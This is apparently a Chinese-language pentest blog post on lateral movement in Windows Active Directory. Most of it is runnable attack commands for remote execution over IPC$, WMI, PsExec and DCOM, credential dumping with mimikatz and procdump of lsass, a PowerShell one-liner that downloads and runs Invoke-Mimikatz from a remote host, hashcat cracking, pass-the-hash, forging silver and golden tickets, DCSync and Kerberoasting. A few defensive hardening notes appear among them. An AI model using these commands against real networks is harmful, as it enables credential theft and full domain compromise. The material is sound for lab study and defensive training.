---
title: 内网渗透测试 <5> 横向移动
key: 4ee4159dd7c6642449676a4b79a6b875
tags:
  - AD Pentest
date: 2020-07-03 15:50:09
---

## Windows Commands

### net use

**IPC（Internet Process Connection）** 进程间通信，指至少两个进程或线程间传送数据或信号的一些技术或方法。IPC 共享“命名管道”的资源，是为了实现进程间通信而开放的命名管道。通过 `IPC$` 可以与目标机器建立连接，来访问目标机器中的文件，进行上传、下载操作；运行其他命令，获取目标及其的目录结构、用户列表等信息。

`IPC$` (空会话连接)是 Windows 系统内置的一个功能模块，它的作用有很多(包括域帐号枚举)，但是其中对于攻击者最关心地还是它的网络文件共享能力，它允许本机的进程/服务以命名管道(named pipe)的形式连接连接上来以实现文件的共享传输，根据对应 IPC$ 共享目录的 ACL 权限来决定是否可写/可遍历等权限。

```cmd
net use 列出本机网络连接 
net use \\IP\ipc$  /user:"帐号" "密码" 建立与指定 IP 的 IPC$ (空连接) 
net use z: \\IP\c$ /user:"帐号" "密码" 将对方的 C 盘映射为自己的 Z 盘 
net use \\IP\ipc$ /del 删除与指定 IP 的 IPC$ 连接 
net use z: /del 删除本机映射的 z 盘 
net use * /del 删除本机所有映射和 IPC$连接 
如提示：提供的凭据与已存在的凭据冲突， net use * /del 即可
```

![](/assets/images/move/2020-07-03-16-43-48.png)

**\* IPC$ 的利用条件**

**1.开启了 139、445 端口。**
**SMB**（Server Message Block）网络文件共享协议在 NT/2000 中用来作文件共享，在 Win-NT 中，SMB 运行于 NBT（NetBIOS over TCP/IP）上，使用137，139（UDP），139（TCP）端口。 
SMB 可以以不同方式运行在会话层或者更低的网络层之上：
- 直接运行在 TCP 上 port **445**;
- 通过使用 NetBIOS API, 它可以运行在几种不同的 transports:
  - 基于 UDP ports 137, 138 & TCP ports 137, **139 (NetBIOS over TCP/IP)**;
  - 基于一些传统协议，例如 NBF (incorrectly referred to as NetBEUI).
SMB 的 "进程间通信" (IPC) 系统提供 命名管道s 机制，它使得程序员可以方便的实现继承认证(客户端第一次连接SMB服务获取认证信息后)。
- `139` NetBIOS File and Print Sharing 通过这个端口进入的连接试图获得 NetBIOS/SMB 服务。SMB 最初使用 139 端口在 NetBIOS 之上运行。NetBIOS 是旧的传输层，它允许 Windows 计算机在同一网络上相互通信。
- `445` 更高版本的 SMB（在 Windows 2000 之后）开始在 TCP 堆栈顶部使用 445端口。使用 TCP 允许 SMB 通过 Internet 工作。 

**2.管理员开启了默认共享。**

建立 ipc$ 后，可通过 tasklist 指定 /S /U /P 参数查看远程主机上运行的进程。

```cmd
tasklist /S 192.168.1.3 /U HACK/002 /P HACK@2020
```

![](/assets/images/move/2020-07-03-16-46-04.png)


### at & schtasks

`at` 是 Windows 自带的用于创建计划任务的命令，主要工作在 Windows Server 2008 之前版本。

```cmd
# 1.查看目标系统时间
net time \\192.168.1.3
# 2.将文件复制到目标系统中
copy calc.bat \\192.168.1.3\c$
# 3.使用 at 创建计划任务
at \\192.168.1.3 4:11PM C:\clac.bat
at \\192.168.1.3 4:41PM cmd.exe /c "ipconfig >C:/1.txt"
# 4.删除计划任务
at \\192.168.1.3 job_id /delete
```

`schtasks` Windows Vista、Windows Server 2008 之后的版本废弃了 at 命令，采用 schtasks 取代了 at。

**创建计划任务：**

```cmd
schtasks /create /s 192.168.1.3 /sc onstart /tn test /tr c:\calc.bat /ru ststem /f
```

参数：`/s` Computer; `/sc` ScheduleType; `/tn` TaskName; `tr` TaskRun; `/ru` System 使用 System 权限运行; `/f` 禁止显示确认消息。

**运行计划任务：**

```cmd
schtasks /run /s 192.168.1.3 /i /tn "test"
```

参数：`/i` IdleTime 指定任务开始前计算机空闲时间。

**删除计划任务：**

```cmd
schtasks /delete /s 192.168.1.3 /tn "test" /f
```

## Windows Hash

在域环境中，用户信息存储在 ntds.dit 中。从 Windows Vista 和 Windows Server 2008 版本开始，Windows 默认禁止了 LM Hash.（aad3b435b51404eeaad3b435b51404ee 表示 LM Hash 为空值或被禁用）。


### 密码抓取与防范

要想在 Windows 操作系统中抓取散列值或明文密码，**必须将权限提升为 System**。本地用户名、散列值和其他安全验证信息都保存在 `SAM`（Security Account Manager） 文件中。**lsass.exe** 进程用于实现 Windows 的安全策略（本地安全策略和登录策略）。可使用工具将散列值和明文密码从内存中的 lsass.exe 进程或 SAM 文件中导出。

- `SAM` 安全账户管理器数据库文件 C:\Windows\System32\config\SAM

  该文件是被锁定的，不允许复制，传统方法：关机后使用 PE 盘进入文件管理环境复制、VSS 卷影复制。

- `lsass.exe` 是一个系统进程，用于微软 Windows 系统的安全机制。 它用于本地安全和登陆策略。

**1. GetPassword** -> Password

![](/assets/images/move/2020-07-03-17-58-11.png)

**2. PwDump7** -> NTLM Hash

![](/assets/images/move/2020-07-03-18-07-20.png)

**3. QuarksPwDump**

![](/assets/images/move/2020-07-03-18-55-45.png)

**4. 通过 SAM 和 System 文件抓取密码**

（1）导出 SAM 和 System 文件


```cmd
reg save hklm\sam sam.hive
reg save hklm\system system.hive
```

（2）通过读取 SAM 和 System 文件获取 NTLM Hash

- 使用 mimikatz 读取 sam 和 system 文件。
  mimikatz 可从内存中提取明文密码、散列值、PIN 和 Kerberos 票据，也可以执行哈希传递、票据传递或者构建黄金票据（Golden Ticket）。

  ```cmd
  mimikatz.exe "lsadump::sam /sam:sam.hive /system:system.hive"
  ```

![](/assets/images/move/2020-07-04-10-37-47.png)

- 使用 mimikatz直接读取本地 SAM 文件

  ```cmd
  mimikatz.exe "privilege::Debug" "token::elevate" "lsadump::sam"
  ```

**5. 使用 mimikatz 在线读取 SAM 文件** -> 获取 Hash 及明文密码

```cmd
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"
```


**6. 使用 mimikatz 离线读取 lsass.dmp 文件**

在 Windows NT 6 中，可直接在任务管理器进行 Dump 操作：

![](/assets/images/move/2020-07-04-10-57-21.png)

还可以使用微软官方提供的 ProcDump 工具进行导出：

```cmd
procdump64.exe  -ma lsass.exe lsass.dmp
```

![](/assets/images/move/2020-07-04-11-09-09.png)


使用 mimikatz 加载 lsass.dump 导出：

```cmd
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords full"
```

![](/assets/images/move/2020-07-04-11-12-46.png)

**7. 使用 Powershell 对散列值进行 Dump 操作**

Nishang/Get-PassHashes.ps1:

```cmd
powershell -exec bypass -Command "& {Import-Module Get-PassHashes.ps1; Get-PassHashes}"
```

![](/assets/images/move/2020-07-04-11-44-40.png)

**8. 使用 Powershell 远程加载 Mimikatz 抓取 Hash 和密码**

```cmd
powershell "IEX(New-Object System.Net.Webclient).DownloadString('http://host/Powershell/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
powershell -version 2 "IEX(New-Object System.Net.Webclient).DownloadString('http://host/Powershell/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
```

**- 单击密码抓取的防范 -**

**1. 安装 KB2871997 补丁**


微软为了防止用户密码在内存中以明文形式泄露，发布了补丁 [KB2871997](https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/)，关闭了 Wdigest 功能。

**KB2871997**：

更新 KB2871997 补丁后，可禁用 Wdigest Auth 强制系统的内存不保存明文口令，此时 mimikatz 和 wce 均无法获得系统的明文口令。但是其他一些系统服务(如 IIS 的 SSO 身份验证)在运行的过程中需要 Wdigest Auth 开启，所以补丁采取了折中的办法——安装补丁后可选择是否禁用 Wdigest Auth。当然，如果启用 Wdigest Auth，内存中还是会保存系统的明文口令。




**2. 修改注册表禁止在内存中存储明文密码** 

Windows Server 2012 R2 及以上版本默认关闭 Wdigest，2012 以下版本如果安装启用了 KB2871997 也无法获取明文密码。

开启或关闭 Wdigest Auth:

- reg add

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
```

- powershell

```powershell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0
```

**3. 设置 Active Directory 2012 R2 功能级别**

Windows Server 2012 R2 新增了一个名为 **“受保护的用户”** 的用户组。只要将需要保护的用户放入该组，攻击者就无法使用 minikatz 等工具抓取明文密码和散列值了。

**4. 防御 mimikatz 攻击**

根据 Debug 权限确定哪些用户可以将调试器附加到任何进程或内核中，在默认情况下，此权限为本地管理员 Administrator 所有，mimikatz 在抓取散列值或明文密码时需要使用 Debug 权限来读取 lsass.exe 进程。我们可以将拥有 Debug 权限的本地管理员从 Administrator 组中删除。

### Hashcat 破解密码


**9. Hashcat 破解密码**

[Hashcat](https://hashcat.net/hashcat/) 是世界上最快的密码破解程序，是一个支持多平台、多算法的开源的分布式工具。

```
Usage: hashcat [options]... hash|hashfile|hccapxfile [dictionary|mask|directory]...

- [ Options ] -

 Options Short / Long           | Type | Description                                          | Example
================================+======+======================================================+=======================
 -m, --hash-type                | Num  | Hash-type, see references below                      | -m 1000
 -a, --attack-mode              | Num  | Attack-mode, see references below                    | -a 3
 -i, --increment                |      | Enable mask increment mode                           |
     --increment-min            | Num  | Start mask incrementing at X                         | --increment-min=4
     --increment-max            | Num  | Stop mask incrementing at X                          | --increment-max=8
     --force                    |      | Ignore warnings                                      |
     --remove                   |      | Enable removal of hashes once they are cracked       |
     --username                 |      | Enable ignoring of usernames in hashfile             |
     --potfile-disable          |      | Do not write potfile                                 |
 -I, --backend-info             |      | Show info about detected backend API devices         | -I
 -o, --outfile                  | File | Define outfile for recovered hash                    | -o outfile.txt
 -O, --optimized-kernel-enable  |      | Enable optimized kernels (limits password length)    |
 -d, --backend-devices          | Str  | Backend devices to use, separated with commas        | -d 1
 -D, --opencl-device-types      | Str  | OpenCL device-types to use, separated with commas    | -D 1
```

使用 `-b` 参数可以测试当前机器进行破解的基准速度：

![](/assets/images/move/2020-07-04-16-28-01.png)

`-m` 参数指定破解 Hash 的类型，`-a` 参数指定破解模式：

```cmd
- [ Attack Modes ] -

  # | Mode
 ===+======
  0 | Straight -> 字典破解
  1 | Combination -> 组合破解
  3 | Brute-force -> 暴力破解
  6 | Hybrid Wordlist + Mask
  7 | Hybrid Mask + Wordlist
```

在渗透测试中，通常指定字典模式进行破解：

```cmd
hashcat.exe -a -0 -m hash_mode <hash_file> <dictionary1> <dictionary2>
```

将 1-8 指定为数字进行暴力破解：

```cmd
.\hashcat.exe -a 3 -m 0 bae5e3208a3c700e3db642b6631e95b9 --increment --increment-min 1 --increment-max 8 ?d?d?d?d?d?d?d?d -O
```

![](/assets/images/move/2020-07-04-16-41-09.png)

破解 Windows 散列值：

```cmd
hashcat.exe -a 0 -m 1000 win.hash password.list -o crackok.txt --username
```

破解 Wi-Fi 握手包（需要使用 Aircrack-ng 把 cap 格式转化为 hccap 格式）：

```cmd
aircrack-ng <out.cap> -J <out.hccap>
hashcat.exe -a 0 -m 2500 out.hccap dics.txt
```

## Pass the Hash

[哈希传递](https://attack.mitre.org/techniques/T1075/)（Pass the hash, PtH）是一种无需知道用户的明文密码即可作为用户身份验证的方法。此方法绕过需要明文密码的标准身份验证步骤，而直接进入使用密码哈希的身份验证部分。此技术使用凭据访问技术捕获正在使用的帐户的有效密码哈希。捕获的哈希与 PtH 一起使用以验证该用户身份。 一旦通过身份验证，PtH 可用于在本地或远程系统上执行操作。

- 在 Windows 系统中，通常会使用 NTLM 进行身份认证。
- NTLM 认证不使用明文口令，而是使用口令加密后的 Hash 值，hash 值由系统 API 生成(例如 LsaLogonUser)。
- hash 分为 LM hash 和 NT hash，如果密码长度大于 15，那么无法生成 LM hash。从 Windows Vista 和 Windows Server 2008 开始，微软默认禁用 LM hash。
- 如果攻击者获得了 hash，就能够在身份验证的时候模拟该用户(即跳过调用 API 生成 hash 的过程)。

### mimikatz

```cmd
# ntlm hash
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:administrator /domain:HACK /ntlm:fed7b3afcb7565ad9e3584694bba77f8 /run:c:\windows\system32\cmd.exe"
# aes-256 <- KB2871997 已安装
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:administrator /domain:HACK /aes256:<aes256> /run:c:\windows\system32\cmd.exe"
```

![](/assets/images/move/2020-07-05-11-36-51.png)

**KB2871997:**

微软在 2014 年 5 月发布了 KB2871997，该补丁禁止通过本地管理员权限与远程计算机进行连接，导致无法通过本地管理员权限对远程计算机使用 PsExec、WMI、smbexec、schtasks、at，同时也无法访问远程主机的文件共享等。

在实际测试中，更新该补丁后，发现无法使用常规的哈希传递方法进行横向移动，但 Administrator 账号(**SID：500**)例外，使用该账号的 Hash 值依然可以进行哈希传递。

**注:**

- mimikatz 的 pth 功能需要本地管理员权限，这是由它的实现机制决定的，需要先获得高权限进程 lsass.exe 的信息.

- 对于8.1/2012r2，安装补丁 kb2871997 的 Win 7/2008r2/8/2012，可以使用 AES keys 代替 NT hash.


### impacket

**wmiexec:**

```cmd
wmiexec -hashes 00000000000000000000000000000000:fed7b3afcb7565ad9e3584694bba77f8 HACK/administrator@192.168.1.1 "whoami"
```

![](/assets/images/move/2020-07-05-12-08-18.png)


### Powershell

\> https://github.com/Kevin-Robertson/Invoke-TheHash/


**Invoke-WMIExec：**


```powershell
Invoke-WMIExec -Target 192.168.1.1 -Domain HACK -Username administrator -Hash fed7b3afcb7565ad9e3584694bba77f8 -Command "calc.exe" -verbose
```

**Invoke-SMBExec：**

支持 SMB1, SMB2 (2.1), and SMB signing，通过在目标主机创建服务执行命令，所以权限为 system。

```powershell
Invoke-SMBExec -Target 192.168.1.1 -Domain HACK -Username administrator -Hash fed7b3afcb7565ad9e3584694bba77f8 -Command "calc.exe" -verbose
```

**Invoke-SMBClient：**

支持 SMB1, SMB2 (2.1), and SMB signing

如果只有 SMB 文件共享的权限，没有远程执行权限，可以使用该脚本.

支持的功能包括列举目录、上传文件、下载文件、删除文件(具体权限取决于该口令 hash 的权限).


## Pass the Ticket

![](/assets/images/move/2020-07-05-16-29-06.png)


票据传递（Pass the Ticket, PtT）是一种使用 Kerberos 票据对系统进行身份验证的方法，无需帐户密码。 Kerberos 身份验证可以用作横向移动到远程系统的第一步。
在这种技术中，凭据转储会捕获有效帐户的有效 Kerberos 票据。取决于访问级别，可以获得用户的服务票据或票据授予票据（TGT）。服务票据允许访问特定资源，而TGT 可以用于从票据授予服务（TGS）请求服务票证以访问用户有权访问的任何资源。

参考：[彻底理解Windows认证 - 议题解读](https://payloads.online/archivers/2018-11-30/1)

#### Silver Tickets

**白银票据(Silver Tickets)** 可用于使用 Kerberos 作为身份验证机制的服务，以访问该特定资源和承载该资源的系统 (e.g., SharePoint)。

制作白银票据的条件：

1. 域名称

2. 域的 SID 值

3. 域服务账户的密码 NTLM HASH（不是 krbtgt，为 机器名`$`，Domain Computers 组用户）

4. 伪造的用户名，可以是任意用户名

白银票据特点:

1. 不需要与 KDC 进行交互
2. 需要目标服务的 NTLM Hash

在第三步认证中的 Ticket 的组成:

~~~
Ticket=Server Hash(Server Session Key+Client info+End Time) 
~~~

当拥有 Server Hash 时，我们就可以伪造一个不经过 KDC 认证的一个 Ticket。

**PS: Server Session Key 在未发送 Ticket 之前，服务器是不知道 Server Session Key 是什么的。 所以，一切凭据都来源于 Server Hash。**

**伪造白银票据：**

首先需要导出 Server Hash：

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > log.txt
```

伪造票据：

```cmd
# rc4 指定 WIN-7$ 的 Hash，Domain Computers 组用户
mimikatz.exe "kerberos::golden /domain:hack.site /sid:S-1-5-21-313574889-3468111967-1448950884 /target:WIN-7.hack.site /service:cifs /rc4:b2aa94f0ac2ccf85ae5975904a31db25 /user:anyone /ptt" "exit"
```

![](/assets/images/move/2020-07-05-17-26-58.png)

通过 klist 查看本机的 kerberos 票据，使用 dir \\\\WIN-7.hack.site\\c$ 访问 WIN-7 的共享文件夹：

![](/assets/images/move/2020-07-05-17-27-30.png)

Other：

- kerberos::list -> 列出票据
- kerberos::purge -> 清除票据

将内存中的票据导出：

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export"
```

将票据文件注入内存：

```cmd
mimikatz.exe "kerberos::ptt 文件路径"  
```

![](/assets/images/move/2020-07-05-16-45-58.png)

由于白银票据需要目标服务器的 Hash，所以没办法生成对应域内所有服务器的票据，也不能通过 TGT 申请。因此只能针对服务器上的某些服务去伪造，伪造的服务类型列表如下:

| 服务名  | 服务注释 |
| :-------- | :--------| 
| RPCSS  | WMI	HOST | 
| HOST、HTTP | Powershell Remoteing | 
| HOST、HTTP | WinRM | 
| HOST | Scheduled Tasks |
| LDAP | LDAP 、DCSync |
| CIFS | Windows File Share |
| RPCSS、LDAP、CIFS | Windows Remote ServerAdministration Tools |

银票生成时没有 KRBTGT 的密码，所以不能伪造 TGT 票据，只能伪造由 Server 端密码加密的 ST 票据，只能访问指定的服务。

**防御手段：**

1. 尽量保证服务器凭证不被窃取

2. 开启 PAC (Privileged Attribute Certificate) 特权属性证书保护功能，PAC 主要是规定服务器将票据发送给 Kerberos 服务，由 Kerberos 服务验证票据是否有效。

```cmd
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters /v ValidateKdcPacSignature /t REG_DWORD /d 1 /f
```

### Golden Tickets

**黄金票据(Golden Tickets)** 可以使用密钥分发服务帐户 KRBTGT 帐户 NTLM Hash 来生成，可以为 Active Directory 中的任何帐户生成 TGT。

黄金票据是伪造**票据授予票据**（TGT），也被称为认证票据。如下图所示，与域控制器没有 AS-REQ 或 AS-REP（步骤 1 和 2）通信。由于黄金票据是伪造的 TGT，它作为 TGS-REQ 的一部分被发送到域控制器以获得服务票据。

![](/assets/images/move/2020-07-05-21-38-20.png)

Kerberos 黄金票据是有效的 TGT Kerberos 票据，因为它是由域 Kerberos 帐户（KRBTGT）加密和签名的。TGT 仅用于向域控制器上的 KDC 服务**证明用户已被其他域控制器认证**。TGT 被 KRBTGT 密码散列加密并且可以被域中的任何 KDC 服务解密的。

黄金票据特点:

1. 需要与 DC 通信
2. 需要 krbtgt 密钥发行中心服务账户用户的 hash（即 KDC Hash）


伪造黄金票据：

mimikatz 导出 DC krbtgt 账户的 NTLM Hash：

```cmd
mimikatz.exe "log" "lsadump::dcsync /domain:hack.site /user:krbtgt" "exit" > log.txt
```

![](/assets/images/move/2020-07-05-22-01-13.png)

[DCSync](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync/) 是 mimikatz 在 2015 年添加的一个功能，由 Benjamin DELPY gentilkiwi 和 Vincent LE TOUX 共同编写，能够用来导出域内所有用户的 hash.

**利用条件：**

获得以下任一用户的权限：

- Administrators 组内的用户
- Domain Admins 组内的用户
- Enterprise Admins 组内的用户
- 域控制器的计算机帐户

**利用原理:**

利用 DRS(Directory Replication Service) 协议通过 IDL_DRSGetNCChanges 从域控制器复制用户凭据.


导出域内所有用户的 hash：

```cmd
mimikatz.exe "lsadump::dcsync /domain:hack.site /all /csv" exit
```

![](/assets/images/move/2020-07-05-22-21-35.png)

导出域内 administrator 帐户的 hash：

```cmd
mimikatz.exe "lsadump::dcsync /domain:test.com /user:administrator /csv" exit
```

**生成黄金票据：**

```cmd
# 导入内存
mimikatz "kerberos::golden /domain:hack.site /sid:S-1-5-21-313574889-3468111967-1448950884 /rc4:b031478fac90b1d71e916df3c11cf2d3 /user:god /ptt" "exit"
# 导出导入
mimikatz "kerberos::golden /domain:hack.site /sid:S-1-5-21-313574889-3468111967-1448950884 /rc4:b031478fac90b1d71e916df3c11cf2d3 /user:god /ticket:golden.kirbi" "exit"
mimikatz.exe "kerberos::ptt 文件路径" 
```

![](/assets/images/move/2020-07-05-22-09-12.png)

验证成功：

![](/assets/images/move/2020-07-05-22-09-42.png)



Tickets 总结：

**黄金票据:** 从攻击面来看，获取 krbtgt 用户的 hash 后，可以在域中进行持久性的隐藏，并且日志无法溯源，但是需要拿到 DC 权限， 使用黄金票据能够在一个域环境中长时间控制整个域。

从防御角度来看，需要经常更新 krbtgt 的密码，才能够使得原有的票据失效。最根本的办法是不允许域管账户登录其他服务器。

**白银票据:** 从攻击面来看，伪造白银票据的难度比伪造黄金票据的难度较小，因为一个域中的服务器如果对外的话，非常容易被入侵， 并且容易被转储 Server。

从防御角度来看，需要开启 PAC 认证，但这会降低认证效率，增加 DC 的负担，最根本的还是要加固服务器本身对外的服务。

## PsExec

[PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) 是 SysInternals 套件中一款功能强大的软件。PsExec 包含在 PsTools 工具包中，通过 PsExec，可以在远程计算机上执行命令，也可以将管理员权限提升到 System 权限以运行特定的程序。PsExec 的基本原理是：通过管道在远程目标机器上创建一个 psexec 服务，并在本地磁盘中生成一个名为 PSEXESVC 的二进制文件，然后通过 psexec 服务运行命令，运行结束后删除服务。

在与远程目标主机建立 ipc$ 空会话连接的情况下，可执行如下命令获取 System 权限的 Shell:

```cmd
PsExec.exe -accepteula \\192.168.1.3 -s cmd.exe
```

参数: `-accepteula` 第一次运行 PsExec 时会弹出确认框，指定该参数跳过确认框；`-s` 指定以 System 权限运行远程进程，若不使用该参数，则生成 Administrator 权限的 Shell。

如果没有建立 ipc$ ，可以通过 `-u`（域\用户名）、`-p` 参数指定账号和密码进行远程连接：

```cmd
PsExec.exe \\192.168.1.3 -u administrator -p HACK@2020 cmd.exe
#获取回显
PsExec.exe \\192.168.1.3 -u administrator -p HACK@2020 cmd.exe /c "ipconfig"
```

注意事项：

- 远程主机需要开启 admin$ 共享（默认开启）

- 在使用 PsExec 时，会在目标系统中创建 PSEXEC 服务，命令执行后，服务自动删除。由于创建服务和删除服务时会产生大量的日志，可以在进行攻击溯源时通过日志反推攻击流程。

MSF 中对应的模块：

- exploit/windows/smb/psexec

- exploit/windows/smb/psexec_psh（Powershell 版本）

## WMI

Windows 管理规范 WMI（Windows Management Instrumentation），从 Windows 98 开始都支持 WMI，WMI 是由一系列工具集组成的，可以在本地或远程管理计算机系统。

自 PsExec 在内网中被严格监控后，越来越多的反病毒厂商将 PsExec 加入了黑名单。在使用 WMIEXEC 进行横向移动时，Windows 操作系统默认不会将 WMI 的操作记录在日志中，恶意行为被发现的可能性有所降低，隐蔽性有所提高。

使用目的系统的 cmd 执行 ipconfig，并将执行结果保存在 C 盘的 ip.txt 中：

```cmd
wmic /node:192.168.1.3 /user:administrator /password:HACK@2020 process call create "cmd.exe /c ipconfig > c:\ip.txt"
```

建立 ipc$ 后，使用 type 命令读取执行结果：

```cmd
type \\192.168.1.3\c$\ip.txt
```

使用 wmic 远程执行命令，需要在目标系统中启动 WMI 服务，需要开放 `135` 端口（主要用于使用 RPC（Remote Procedure Call，远程过程调用）协议并提供 DCOM（分布式组件对象模型）服务，通过 RPC 可以保证在一台计算机上运行的程序可以顺利地执行远程计算机上的代码；使用 DCOM 可以通过网络直接进行通信，能够包括HTTP 协议在内的多种网络传输）。如果目标系统开启了防火墙，wmic 将无法连接。此外 wmic 命令**没有回显**，需要借助 ipc$ 通过 type 命令读取回显。

Others：

- impacket wmiexec

  ```cmd
  wmicexec.py <username>:<password>@<host>
  ```
  该方法主要用在 Linux 向 Windows 进行横向渗透测试时使用。

- wmiexec.vbs
  wmiexec.vbs 脚本通过 VBS 调用 WMI 来模拟 PsExec 的功能，可以在远程系统中执行命令并获取回显。

  ~~~
  WMI Remote Command Executor   By. Twi1ight@T00ls.Net
   Usage: wmiexec.vbs  /shell  host
          wmiexec.vbs  /shell  host  user  pass
          wmiexec.vbs  /cmd  host  command
          wmiexec.vbs  /cmd  host  user  pass  command

            /shell        half-interactive shell mode
            /cmd          single command mode
            host          hostname or IP address
            command       the command to execute on remote host

            -waitTIME     [either mode] ,delay TIME to read result,
                          eg. 'systeminfo -wait5000' 'ping google.com -wait2000'
            -persist      [either mode] ,running command background and persistent
                          such as nc.exe or Trojan
  ~~~

  获取远程目标主机半交互式 shell：

  ```cmd
  cscript.exe //nologo wmiexec.vbs /shell 192.168.1.3 administrator HACK@2020
  ```
  执行单条命令：
  ```cmd
  cscript.exe //nologo wmiexec.vbs /cmd 192.168.1.3 administrator HACK@2020 "ipconfig"
  ```

- Invoke-WmiCommand

  - PowerSploit\CodeExecution\Invoke-WmiCommand.ps1
  - Windows 从 Windows Server 2008 和 Win 7 版本开始内置 Poweshell

  ```powershell
  Import-Module Invoke-WmiCommand.ps1
  $User = "HACK\Administrator"
  $Password = ConvertTo-SecureString -String "HACK@2020" -AsPlainText-Force
  $Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User, $Password
  $Remote = Invoke-WmiCommand -Payload {ipconfig} -Credential $Cred -ComputerName 192.168.1.1
  $Remote.PayloadOutput
  ```

- Invoke-WmiMethod
  利用 Powershell 自带的 Invoke-WmiMethod 在远程系统中执行系统命令和运行指定程序。
  ```powershell
  $User = "HACK\Administrator"
  $Password = ConvertTo-SecureString -String "HACK@2020" -AsPlainText-Force
  $Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User, $Password
  Invoke-WmiMethod -Class Win32_Process -Name Create -ArguementList "calc.exe" -ComputerName "192.168.1.1" -Credential $Cred
  ```

## smbexec

smbexec 可以通过文件共享（ipc$、admin$、c$、d$）在远程系统中执行命令。

- impacket/smbexec.exe

  ```cmd
  smbexec.exe [[domain/]username[:password]@]<targetName or address>
  ```

## DCOM 

DCOM（分布式组件对象模型）是一系列微软的概念和程序接口，利用这个接口，客户端程序对象能够请求来自网络中另一台计算机上的服务器程序对象。

DCOM 基于组件对象模型（COM），COM 提供了一套允许同一台计算机上的客户端和服务器之间进行通信的接口（运行在 Windows95 或者其后的版本上）。

**通过本地 DCOM 执行命令：**

1. 获取本地 DCOM 程序列表
  Powershell 3.0+ (Windows Server 2012 +)：
  ```powershell
  Get-CimInstance Win32_DCOMApplication
  ```
![](/assets/images/move/2020-07-06-12-59-50.png)
  
  Win 7, Windows Server 2008 默认安装 Powershell 2.0，不支持 Get-CimInstance:
  ```powershell
  Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication
  ```
![](/assets/images/move/2020-07-06-13-07-07.png)

2. 通过 DCOM 执行任意命令

  调用 MMC20.Application 执行命令：
  ```powershell
  #管理员权限执行 PowerShell
  $com = [activator]::CreateInstance([type]::GetTypeFromProgId("MMC20.Application", "127.0.0.1"))
  $com.Document.ActiveView.ExecuteShellCommand('cmd.exe', $null, "/c calc.exe", "Minimzed")
  ```
  执行完毕，将以当前会话执行 Administrator 权限的 calc.exe。

**使用 DCOM 在远程机器上执行命令：**

1. 通过 ipc$ 连接远程计算机

  ```cmd
  net use \\192.168.1.1 /user:HACK\002 "HACK@2020"
  ```

2. 调用 MMC20.Application 远程执行命令：

  ```powershell
  $com = [activator]::CreateInstance([type]::GetTypeFromProgId("MMC20.Application", "192.168.1.1"))
  $com.Document.ActiveView.ExecuteShellCommand('cmd.exe', $null, "/c calc.exe", "Minimzed")
  ```

## SPN

> 在内网渗透的信息收集中，机器服务探测一般都是通过端口扫描去做的，但是有些环境不允许这些操作。通过利用 SPN 扫描可快速定位开启了关键服务的机器，这样就不需要去扫对应服务的端口，有效规避端口扫描动作。
> Kerberoasting 是域渗透中经常使用的一项技术，是通过爆破 TGS-REP 实现。


摘自：[RcoIl -【域渗透】SPN 扫描利用](https://rcoil.me/2019/06/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91SPN%20%E6%89%AB%E6%8F%8F%E5%88%A9%E7%94%A8/)

**服务主体名称**（`SPN`: Service Principal Names）是服务实例，可以将其理解为一个服务（比如 HTTP、MSSQL）的唯一标识符，服务在加入域中时是自动注册的。

如果在整个林或域中的计算机上安装多个服务实例，则每个实例都必须具有自己的 SPN。如果客户端可能使用多个名称进行身份验证，则给定服务实例可以具有多个 SPN。SPN 始终包含运行服务实例的主机的名称，因此服务实例可以为其主机名称或别名注册 SPN。

如果用一句话来说明的话就是如果想使用 Kerberos 协议来认证服务，那么必须正确配置 SPN。

SPN 可以分为两种：

- 注册在域内机器账户（Computers）上（服务的权限为 Local System 或 Network Service）
- 注册在域内用户账户（Users）下


**SPN 标准格式：**

在 SPN 语法中存在 4 种元素，两个必须元素和两个格外元素。其中 `<service class>` 和 `<host>` 为必需元素。

```xml
<service class>/<host>:<port> <servername>
服务类型/对应机器名:服务端口[默认端口可不写]
MSSQLSvc/SQLServer.rcoil.me:1433
```

- service class 可以理解为服务的名称，常见的有 www, ldap, SMTP, DNS, HOST 等
- host 有两种形式，FQDN 和 NetBIOS 名，例如 server01.test.com 和 server01
- 如果服务运行在默认端口上，则端口号可以省略

列出域中所有的 SPN 信息：

```cmd
setspn -T domain -Q */* 
```

扫描工具：

- Discover-PAMSSQLServers (Powershell-AD-Recon)
- GetUserSPNs (Powershell、vbs、Python)
- PowerView (Powershell)
- SetSPN (exe)

获取当前目标域中所有以域用户身份起服务的 SPN：

```cmd
cscript.exe GetUserSPNs.vbs
powerview --> Get-NetUser -SPN
```

**Kerberoast:**

Kerberos TGS 服务票据 (Service Ticket) 离线爆破，在我们取得了 SPN 的修改权限后，可以为指定的域用户添加一个 SPN，这样可以随时获得该域用户的 （TGS 票据许可服务器授予的）**服务票据 ST**，经过破解后获得 Server 端的明文口令。

